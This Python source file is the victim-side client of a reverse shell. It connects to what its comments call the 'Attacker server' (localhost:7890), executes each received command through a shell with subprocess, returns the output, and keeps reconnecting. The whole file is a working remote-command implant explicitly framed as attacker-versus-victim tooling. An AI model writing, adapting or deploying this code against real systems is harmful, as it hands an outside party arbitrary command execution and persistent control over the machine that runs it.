import os
import subprocess
from command_payload import CommandPayload
from command_payload import parse_payload_to_output
from secure_socket import SecureSocket

# Attacker server ip and port
ip = "localhost"
port = 7890

exit_flag = False


# Custom command behaviour
def run_custom_command(cmd: str) -> str:
    global exit_flag
    if cmd == "exit":
        exit_flag = True
        return "Session ended"
    return ""


# Create the victim socket that keep trying to connect to the server
def create_socket():
    global exit_flag
    secure_socket = SecureSocket()
    secure_socket.connect()
    while True:
        # Receive data from the server
        payload = secure_socket.receive(parse_payload_to_output)
        if type(payload) is not CommandPayload:
            if len(payload) == 0:
                print("Connection lost")
                secure_socket.close()
                create_socket()
            else:
                continue
        # Parse received data
        command = payload.command
        print('Received:'.center(40, "="))
        print(command)

        # Parse custom commands
        if command.split(" ")[0] == "->":
            custom_command = command.split(" ")[1]
            result = run_custom_command(custom_command)
            payload = CommandPayload(stdout=result)
        else:
            # Generate command
            result = run_command(command)
            payload = CommandPayload(stdout=result[0], stderr=result[1])

        print(result)
        packet = payload.pack()

        if not secure_socket.send(packet):
            print("Connection lost")
            create_socket()

        if exit_flag:
            secure_socket.close()
            create_socket()


# Run a line of shell command and returns the result
# Todo: Keep one subprocess alive
def run_command(cmd):
    cmd_split = cmd.split(" ")
    result = ["", ""]
    if cmd_split[0] == "cd":
        if len(cmd_split) > 1:
            try:
                os.chdir(cmd_split[1])
            except:
                result[1] = "No such directory"
    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
    return result


def main():
    create_socket()


if __name__ == '__main__':
    main()
